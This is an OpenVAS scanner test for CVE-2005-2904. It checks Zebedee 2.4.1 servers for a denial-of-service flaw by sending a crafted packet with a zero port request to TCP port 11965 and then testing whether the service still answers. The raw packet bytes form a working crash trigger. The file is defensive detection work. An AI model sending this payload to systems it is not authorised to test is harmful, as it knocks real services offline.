###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_zebedee_redirection_port_dos_vuln.nasl 11888 2018-10-12 15:27:49Z cfischer $
#
# Zebedee Allowed Redirection Port Denial of Service Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903028");
  script_version("$Revision: 11888 $");
  script_cve_id("CVE-2005-2904");
  script_bugtraq_id(14796);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 17:27:49 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-05-24 11:08:06 +0530 (Thu, 24 May 2012)");
  script_name("Zebedee Allowed Redirection Port Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(11965);

  script_xref(name:"URL", value:"http://secunia.com/advisories/16788/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/22220");
  script_xref(name:"URL", value:"http://www.juniper.net/security/auto/vulnerabilities/vuln14796.html");

  script_tag(name:"impact", value:"Successful exploitation will allows remote attackers to cause a denial of
  service via a zero in the port number of the protocol option header.");
  script_tag(name:"affected", value:"Zebedee version 2.4.1");
  script_tag(name:"insight", value:"The flaw is due to an error, while handling a connection request that
  contains a port number value '0'.");
  script_tag(name:"solution", value:"Upgrade to Zebedee 2.4.1A or later.");
  script_tag(name:"summary", value:"The host is running Zebedee server and is prone to denial
  of service vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.winton.org.uk/zebedee/download.html");
  exit(0);
}

port = 11965;

if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);

if(!soc){
  exit(0);
}

crap = raw_string(
    0x02, 0x01,                                      # protocol version
    0x00, 0x00,                                      # flags
    0x20, 0x00,                                      # max message size
    0x00, 0x06,                                      # compression info
    0x00, 0x00,                                      # port request: value = 0x0
    0x00, 0x80,                                      # key length
    0xff, 0xff, 0xff, 0xff,                          # key token
    0x0b, 0xd8, 0x30, 0xb3, 0x21, 0x9c, 0xa6, 0x74,  # nonce value
    0x00, 0x00, 0x00, 0x00                           # target host address
  );

## Send the crap data
send(socket:soc,data:crap);
sleep(1);

close(soc);

soc1 = open_sock_tcp(port);
if(!soc1)
{
  security_message(port);
  exit(0);
}

close(soc1);
